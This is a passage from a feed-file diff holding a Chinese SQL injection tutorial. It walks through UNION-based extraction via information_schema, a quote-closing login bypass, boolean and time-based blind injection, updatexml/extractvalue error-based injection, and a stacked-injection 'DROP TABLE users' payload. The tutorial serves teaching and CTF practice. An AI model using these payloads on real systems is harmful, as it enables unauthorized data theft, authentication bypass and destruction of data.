+<p>然而，用户的输入因为没有过滤的缘故，不管输入什么都会直接拼接到后面，所以我们可用用下面的步骤逐步得到数据库信息：</p>
+<ul>
+<li>使用 <code>Order by</code> 确定列数，方便后续注入。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 Order by 1;</span><br><span class="line">id = 1 Order by 2;</span><br><span class="line">id = 1 Order by 3; # 报错 确定列数为 2 </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br><span class="line"># or</span><br><span class="line">1 union SELECT schema_name,2 FROM information_schema.schemata;</span><br><span class="line"># 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。</span><br><span class="line"># 此时后台执行为:</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261957162.png" alt="image-20230426195745130"></p>
+<p> 也可以把1换成其他的，比如<code>database()</code> 这样我们可以知道我们当前在哪个数据库</p>
+<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261959665.png" alt="image-20230426195952638"></p>
+<ul>
+<li>下面就是用联合查询得到数据库里面的表名，一般步骤我们都是先获取当前库 ( <code>database()</code> ) 的表，再去看其他库的。</li>
+</ul>
+<p>这里我们基于<code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br><span class="line"># 原理同上</span><br><span class="line"># 如果要查询其他数据库 可以写为 where table_schema=&#x27;databaseNAME&#x27;</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262013324.png" alt="image-20230426201306290"></p>
+<ul>
+<li>下面就是去获得 表 的对应字段名 方便我们最后一步的查询工作</li>
+</ul>
+<p>这里我们使用<code>UNION</code> <code>GROUP_CONCAT(column_name)</code> 和 <code>information_schema.columns</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()</span><br><span class="line">1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262026058.png" alt="image-20230426202627021"></p>
+<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>下面我们假设一个登录系统，那么他会接收两个参数 用户名和密码 后台的查询语句可能这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>对于这种，开发时，预期数据收到的参数都为字符，使用字符进行查询的数据库的注入漏洞 我们称为字符型注入。</p>
+<p>与数字型不同的是，我们需要先构造单引号的闭合。</p>
+<p>这里我们让 <code>$username</code>&#x3D; <code>-1&#39; or &#39;1&#39;=&#39;1&#39; --</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; -- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262032468.png" alt="image-20230426203250434"></p>
+<p>就可以使<code>Where</code>的条件永真,直接输出<code>SELECT * FROM users</code>的所有内容。</p>
+<p>同样，与数字型的注入方式类似，我们也可以使用联合查询的方法来获取数据库信息。</p>
+<p><code>order by</code>判断列数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 1-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 2-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 3-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 4-- &#x27; AND password=&#x27;$password&#x27;; # 报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262132275.png" alt="image-20230426213252233"></p>
+<p>那么接下来就和数字型注入相同 吧 <code>order by NUM</code> 换成对应的语句即可：</p>
+<ul>
+<li>库名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union SELECT 1,schema_name,2 FROM information_schema.schemata;-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>表名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>- 字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。</p>
+<p>我们还是以下面的句子为例子，不过相比于之前的不同，我们规定用户的查询没有回显，所以仅靠上面的方式我们无法获得数据，所以我们选用盲注。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
+
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>对于上述语句，如果id的传参如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND 1=1</span><br></pre></td></tr></table></figure>
+
+<p>那么语句执行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND 1=1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041911785.png" alt="image-20230504191135714"></p>
+<p>这里会要求两个条件为真，一是有<code>id=1</code>这个值，二是 <code>1=1</code>，这两个条件当然是满足的，特别是后面的这个条件。</p>
+<p>那如果我让AND后面的条件为 <code>1 = 2</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND &#x27;1&#x27;=&#x27;2&#x27;;</span><br><span class="line"># 这里 &#x27;1&#x27; = &#x27;2&#x27;，1 = 2 效果都是一样的</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041915652.png" alt="image-20230504191548610"></p>
+<p>可以看到返回为空，因为AND后面的条件不满足。</p>
+<p>那么利用这个AND符号我们可以尝试下面的一些方式来获取信息：</p>
+<ul>
+<li>使用 length(）获取长度信息</li>
+</ul>
+<p>比如，我们用 length(）函数去爆破数据长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)= NUM</span><br></pre></td></tr></table></figure>
+
+<p>那么语句执行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND length(username)=1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041921180.png" alt="image-20230504192130407"></p>
+<p>当然 枚举长度的方式效率属实难蚌，我们可以使用大于小于符号 基于二分算法进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)&lt; NUM</span><br><span class="line">id = 1 AND length(username)&gt; NUM</span><br></pre></td></tr></table></figure>
+
+<p>这样效率会高很多。</p>
+<ul>
+<li><code>SUBSTR()</code>函数用于截取字符串中的一部分。利用<code>SUBSTR()</code>函数，逐步截取数据库中的某个数据：</li>
+</ul>
+<p><code>SUBSTR(string, start, length)</code> 其中，<code>string</code>表示要截取的字符串，<code>start</code>表示截取的起始位置，<code>length</code>表示截取的长度。<code>SUBSTR()</code>函数会从字符串的<code>start</code>位置开始，截取指定长度的字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 AND SUBSTR(username,1,1) = &#x27;?&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那么语句执行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,1,1) = &#x27;?&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042115906.png" alt="image-20230504211550827"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,2,1) = &#x27;d&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042121944.png" alt="image-20230504212127894"></p>
+<p>通过前部分长度的获取，结合 <code>substr()</code> 就可以对一个具体的字符数据进行fuzz了。</p>
+<p>这里推荐编写脚本来完成这样繁琐的工作。</p>
+<p>除了上述用法 <code>SUBSTR()</code>函数还可以用于替换字符串中的某个字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET username=SUBSTR(username,1,3)||&#x27;***&#x27;||SUBSTR(username,7) WHERE username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>面的SQL语句的作用是将管理员账户的用户名中的第4到第6个字符替换为<code>***</code></p>
+<p>通过对该函数的组合使用，可以在不使用联合注入和依赖可视回显的方式拿到对应数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>MID()</code>函数也是用于截取字符串的函数。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MID(string, start, length)</span><br><span class="line">MID(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;；</span><br><span class="line">SUBSTR(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>CONCAT()</code></li>
+</ul>
+<p><code>CONCAT()</code>函数用于将多个字符串连接成一个字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONCAT(string1, string2, ...)</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,&#x27;-&#x27;,password),1 from users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042218959.png" alt="image-20230504221859903"></p>
+<p>而在盲注中，我们通常用其的连接功能减少查询跳转。</p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>其实和布尔差不多，只不过是利用SQL语句的执行时间来判断SQL语句的真假，从而逐步推断出数据库中的数据。</p>
+<p>下面是一些常用函数 和使用技巧：</p>
+<ul>
+<li><code>IF()</code></li>
+</ul>
+<p><code>IF()</code>函数是一种条件判断函数，它用于判断指定条件是否成立，并根据判断结果返回不同的值.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(condition, value_if_true, value_if_false)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>condition</code>表示要判断的条件，<code>value_if_true</code>表示条件成立时要返回的值，<code>value_if_false</code>表示条件不成立时要返回的值。如果条件成立，<code>IF()</code>函数将返回<code>value_if_true</code>，否则将返回<code>value_if_false</code></p>
+<ul>
+<li><code>SLEEP()</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SLEEP()` 函数是时间盲注的核心，其语法为 `SLEEP(seconds)</span><br></pre></td></tr></table></figure>
+
+<p>当语句被执行时，程序将会暂停指定秒数，比如下面的例子：</p>
+<p>通常 <code>IF</code> 和 <code>SLEEP</code> 两函数会一起使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(SLEEP(5),1,0)</span><br></pre></td></tr></table></figure>
+
+<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回结束；否则，程序将会暂停5秒钟后再返回结果。</p>
+<p>同样我们使用我们的demo语句，<code>SELECT username,password FROM users WHERE id =</code>来演示：</p>
+<ul>
+<li>利用延时函数，如<code>SLEEP()</code>函数或者<code>BENCHMARK()</code>函数，来判断是否注入成功。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(ASCII(SUBSTR(username,1,1))=97,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
+
+<p>如果用户表中的第一个用户名字符为字母<code>a</code>，则程序会暂停5秒钟，否则返回0。</p>
+<ul>
+<li>利用时间戳</li>
+</ul>
+<p>可以利用数据库中的时间戳函数，如<code>UNIX_TIMESTAMP()</code>函数来构造延时语句，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(UNIX_TIMESTAMP()&gt;1620264296,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
+
+<p>上述SQL语句的意思是：如果当前时间戳大于<code>1620264296</code>，则程序会暂停5秒钟，否则返回0。</p>
+<ul>
+<li>利用函数返回值</li>
+</ul>
+<p>可以利用函数的返回值，如<code>LENGTH()</code>函数、<code>SUBSTR()</code>函数等，来判断是否注入成功。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(LENGTH(username)=4,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
+
+<p>上述SQL语句的意思是：如果用户名的长度为4，则程序会暂停5秒钟，否则返回0。</p>
+<ul>
+<li><code>BENCHMARK()</code></li>
+</ul>
+<p><code>BENCHMARK()</code>函数是一种用于重复执行指定语句的函数，在MySQL等数据库中支持使用。<code>BENCHMARK()</code>函数的语法通常如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>count</code>表示要重复执行的次数，<code>expr</code>表示要重复执行的语句。</p>
+<p>看这个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(BENCHMARK(10,MD5(&#x27;test&#x27;)),1,0)</span><br></pre></td></tr></table></figure>
+
+<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回；否则，程序将会重复执行<code>MD5(&#39;test&#39;)</code>函数10次后再返回结果</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>顾名思义，通过报错信息获取数据的方法。</p>
+<ul>
+<li><code>updatexml()</code></li>
+</ul>
+<p>这里我们先讲 <code>updatexml()</code> 报错注入。</p>
+<p><code>updatexml()</code> 是MySQL中的一种XML处理函数，它用于更新XML格式的数 据，其标准的用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATEXML(xml_target, xpath_expr, new_value)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>xml_target</code>是要更新的XML数据，<code>xpath_expr</code>是要更新的节点路 径，<code>new_value</code>是新的节点值。</p>
+<p>但是这个函数有一个缺陷，如果二个参数包含特殊符号时会报错，并且会第二 个参数的内容显示在报错信息中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and    updatexml(1, 0x7e, 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那么通过这个特性，我们用 <code>concat()</code> 函数 将查询语句和特殊符号拼接 在一起，就可以将查询结果显示在报错信息中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1, concat(0x7e,version()), 3) </span><br></pre></td></tr></table></figure>
+
+<p>输出:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and  updatexml(1, concat(0x7e,version()), 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~8.0.12&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>不过要注意的是 <code>updatexml()</code> 的报错长度存在字符长度限制，目前有两 种方法来解决这个问题：</p>
+<ul>
+<li><code>LIMIT()</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and   updatexml(1,concat(0x7e,</span><br><span class="line">(select username from users </span><br><span class="line">limit 1,1)),</span><br><span class="line">3);</span><br><span class="line"># 不断改变limit NUM,1 的值逐行获取</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050110708.png" alt="image-20230505011056626"></p>
+<ul>
+<li><p><code>substr()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),</span><br><span class="line">1,31)</span><br><span class="line">),3);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行结果：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),1,31)</span><br><span class="line">),3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~admin,super,flag,null&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>利用利用上述特性，我们可以下面的语句获取信息：</p>
+<p>获取所有数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(schema_name)</span><br><span class="line">                from information_schema.schemata)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
+
+<p>获取所有表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(table_name)</span><br><span class="line">                from information_schema.tables</span><br><span class="line">                where table_schema = &#x27;security&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
+
+<p>获取所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(column_name)</span><br><span class="line">                from information_schema.columns</span><br><span class="line">                where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>extractvalue()</code></li>
+</ul>
+<p><code>extractvalue()</code>是MySQL中的一个XML处理函数，它用于从XML格式的数据中提取指定节点的值。</p>
+<p>正常情况下他的语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTRACTVALUE(xml_target, xpath_expr)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>xml_target</code>是要提取节点值的XML数据，<code>xpath_expr</code>是要提取的节点路径。</p>
+<p>它用于报错注入的方法其实和 <code>updatexml()</code> 函数的使用方法差不多 但是参数少一个x</p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050150790.png" alt="image-20230505015028726"></p>
+<p>而且报错信息长度限制也和<code>updatexml()</code> 一样，所以这里就不多做赘述。</p>
+<ul>
+<li><code>floor()</code></li>
+<li><code>exp()</code></li>
+</ul>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>顾名思义x 一堆 SQL语句(多条)一起执行方法被称为堆叠注入。</p>
+<p>其实讲原理就很容易懂：</p>
+<p>在执行SQL语句时，如果SQL语句中包含多个SQL语句，数据库服务器会依次执行这些SQL语句，从而导致多次SQL注入攻击。通过在SQL语句中使用分号（;）来分隔多个SQL语句，从而实现堆叠注入攻击。</p>
+<p>举个栗子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id =1; DROP TABLE users;--</span><br></pre></td></tr></table></figure>
+
+<p>执行这个SQL语句时，数据库服务器会依次执行这两个SQL语句，将会查询到<code>users</code>表中的用户名和密码，并且将<code>users</code>表删除。</p>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
